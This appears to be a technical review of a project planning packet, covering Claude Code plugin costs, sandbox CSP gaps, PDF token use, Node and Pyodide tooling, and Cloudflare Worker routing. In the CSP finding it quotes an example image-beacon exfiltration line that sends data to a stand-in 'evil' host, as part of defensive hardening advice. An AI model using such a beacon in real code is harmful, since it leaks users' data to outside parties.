findings.item: security-guidance plugin in the token-saving allow-list
findings.issue: The README and hooks.json for v2.0.15 show four hooks: SessionStart, UserPromptSubmit, PostToolUse and Stop. On every Stop (each finished turn) the plugin sends the git diff to the newest Opus. On every git commit or push it starts an agentic Opus reviewer. On session start it may build a venv at ~/.claude/security and pip-install claude_agent_sdk. The reviews run on the user's Claude sign-in by default, so they use up the same plan limits the team already hit. The packet recommends the plugin as a cheap safety add-on and never mentions this cost.
findings.fix: Set ENABLE_STOP_REVIEW=0 by default, and set SECURITY_REVIEW_MODEL and SG_AGENTIC_MODEL to Sonnet 5.5 (claude-sonnet-5-5). Turn the commit review on only for branches that touch the key proxy, the sandbox or auth. Alternatively, keep only the pattern warnings (ENABLE_CODE_SECURITY_REVIEW=0) and run /security-review by hand on those PRs. Compare /usage before and after installing. Add the SessionStart pip install to the supply-chain review.

findings.item: Sandbox origin CSP: 'sandbox allow-scripts' plus connect-src 'none'
findings.issue: MDN lists what connect-src controls: fetch, fetchLater, XHR, WebSocket, EventSource, sendBeacon and a[ping]. Image, style, font and media loads fall under other directives. A community module that receives user geometry over postMessage can therefore still send it out, for example with new Image().src='https://evil/?d=…'. MDN's directive list has no webrtc directive, so RTCPeerConnection or STUN traffic is a further channel that the sandbox does not obviously block. The isolation claim is weaker than the packet states.
findings.fix: On the sandbox origin, send: Content-Security-Policy: sandbox allow-scripts; default-src 'none'; script-src with the pinned module bundle (by sha256 or exact path); img-src data: blob:; style-src 'self' 'unsafe-inline' only if needed; form-action 'none'; base-uri 'none'; frame-ancestors set to the app origin. Never grant allow-popups or allow-top-navigation. Add an exfiltration test to the spike covering an img beacon, CSS url(), RTCPeerConnection and window.open. Run any module that handles user geometry declaratively or in QuickJS, which has no network access.

The page does not state the board count, board size or the format of the site model. findings.item: Citations token cost of sending raw PDFs
findings.issue: The PDF docs say each page is processed as both text and image: 1,500-3,000 text tokens per page plus image tokens. For text-extractable by-laws, the image tokens are pure overhead. The pricing page also says models from Claude 4.7 on use a newer tokenizer that produces about 30% more tokens, so older per-page estimates may run low.
findings.fix: For text PDFs, extract the text locally, one block per page. Send it to the API as a custom-content document (citations come back as content_block_location, where the block index is the page) or as one plain-text document per page (char_location). Do not commit the extracted text. Keep PDF input only for pages that need tables or figures read. Run count_tokens on claude-sonnet-5-5 before batching.

findings.issue: The README says --no-hooks 'skips the hook for that run only, without recording the choice'. The hook is the default on Claude Code, and the saved choice lives in a gitignored, per-developer .impeccable/config.local.json. A later npx impeccable update, or the second student's install, can bring the hook back.
findings.fix: Pass --no-hooks on every install and update on both machines. Add a pre-commit or CI check that fails if an Impeccable hook appears in .claude/settings*.json. Also commit telemetry: false in .impeccable/config.json.

findings.item: Node toolchain via fnm in agent shells
findings.issue: fnm puts Node on PATH through a profile hook (fnm env --use-on-cd). Claude Code's PowerShell tool runs with -NonInteractive, and its Git Bash tool loads a different profile, so node may be missing or the wrong version in agent shells. That would cost tokens on retry loops.
findings.fix: Install Node 24 system-wide with the official MSI so it is on PATH in every shell. Keep .node-version and the engines field (>=22.12 <25) for CI. Use fnm only if a second Node version is really needed; in that case run fnm default 24 and add its default alias directory to the user PATH.

findings.issue: The marketplace entry starts the command 'pyright-langserver --stdio'. Neither Node nor pyright is installed, and the packet's LSP risk note mentions only typescript-language-server.
findings.fix: After installing Node, run npm i -g pyright typescript-language-server typescript, or pip install pyright. Then confirm that /plugin reports both LSP servers as running.

findings.item: Context7 plugin publisher and data flow
findings.issue: The packet left this unchecked. The official marketplace lists context7 with author Upstash and the tag 'community-managed'. It connects to the hosted remote MCP at mcp.context7.com, so queries leave the machine, and its backend is closed.
findings.fix: Record Upstash as a third-party publisher. Put only library names and API questions in queries, never project code or keys. Keep it enabled but invoke it on demand only.

findings.item: Pyodide spike risk for pvlib and PyNite
findings.issue: Checked against the Pyodide 314.0.7 lock file: all of pvlib 0.16.1's runtime dependencies are bundled (numpy 2.4.6, pandas 3.0.2, scipy 1.18.0, h5py 3.13.0, requests, pytz). PyNiteFEA 3.2.0 needs prettytable, which is not bundled but is pure Python. Whether pvlib works with pandas 3.0 is unverified. pvlib.iotools needs network access, which faces CORS limits in the browser.
findings.fix: Lower the spike risk in the flag. Test pandas 3 compatibility in pyodide venv. Never call iotools at runtime; precompute the weather data (see missing).

findings.item: Single Worker serving both the SPA and the key proxy
findings.issue: The Cloudflare SPA routing docs say navigation requests (Sec-Fetch-Mode: navigate) skip the Worker script from compatibility date 2025-04-01. The _headers docs say _headers do not apply to Worker-generated responses. Without explicit routing, proxy routes and CORS headers can be misconfigured.
findings.fix: Set assets.run_worker_first to ["/api/*"]. Set CORS and CSP headers in code on Worker responses. Add both checks to the 1-hour spike.

false_assumptions.claim: security-guidance is a low-overhead addition to a token-saving plugin allow-list.
false_assumptions.why_false: By default it runs an LLM diff review on the newest Opus at every Stop, an agentic Opus commit or push reviewer, and a SessionStart pip install of claude_agent_sdk. All of it uses the user's Claude sign-in.
false_assumptions.correction: Disable the Stop review (ENABLE_STOP_REVIEW=0), move the reviews to Sonnet with SECURITY_REVIEW_MODEL and SG_AGENTIC_MODEL, and enable commit review only for security-sensitive branches.

false_assumptions.claim: CSP 'sandbox allow-scripts' plus connect-src 'none' keeps community modules from sending out data.
false_assumptions.why_false: connect-src covers only fetch, fetchLater, XHR, WebSocket, EventSource, sendBeacon and a[ping]. Image, style, font and media loads fall back to default-src, which the packet does not set. MDN lists no webrtc directive.
false_assumptions.correction: Use default-src 'none' with narrow script-src and img-src (data: blob:), form-action 'none' and base-uri 'none'. Spike-test image-beacon and WebRTC exfiltration, and use QuickJS or declarative modules for geometry-handling code.

false_assumptions.claim: Installing Impeccable with --no-hooks keeps its hook off.
false_assumptions.why_false: The README says --no-hooks skips the hook for that run only and does not record the choice. The hook is the default on Claude Code, and the saved choice is per developer in a gitignored config.local.json.
false_assumptions.correction: Repeat --no-hooks on every install and update on both machines, and check settings files for the hook in CI.

false_assumptions.claim: Observable Plot 0.6.17 has conflicting release dates (possibly April 2026).
false_assumptions.why_false: npm time and the releases Atom feed both give a publish date of 2025-02-14. The feed's 2026-04-12 <updated> value is a later edit of the release entry.
false_assumptions.correction: The last release is 0.6.17, published 14 Feb 2025 (20 months ago). The latest commit on main is 2026-09-01.

false_assumptions.claim: zundo's repo was last pushed 2026-01-30, which suggests some recent activity.
false_assumptions.why_false: The commit feed for the main branch shows the last commit on 2025-04-29. GitHub's pushed_at counts pushes to any branch, and no release has followed since 2024-11-17.
false_assumptions.correction: Treat zundo as dormant since April 2025 (code) and November 2024 (release); vendoring it is the right plan.

verdict: The packet is sound and usable. Versions, licences and prices I re-checked on npm, PyPI, the Anthropic pricing page and the vendor docs match, and all three previous MAJOR items are addressed. Three new MAJOR problems remain. First, the recommended security-guidance plugin by default runs an Opus review after every turn and on every commit, which defeats the token-saving goal. Second, the sandbox's 'connect-src none' still lets a module send user geometry out through image loads and probably WebRTC. Third, VTC registration closes on 29 Oct and the board spec is unconfirmed, yet neither is scheduled. The schedule also has zero buffer. The team can start building now if the gate conditions are met during the first week.
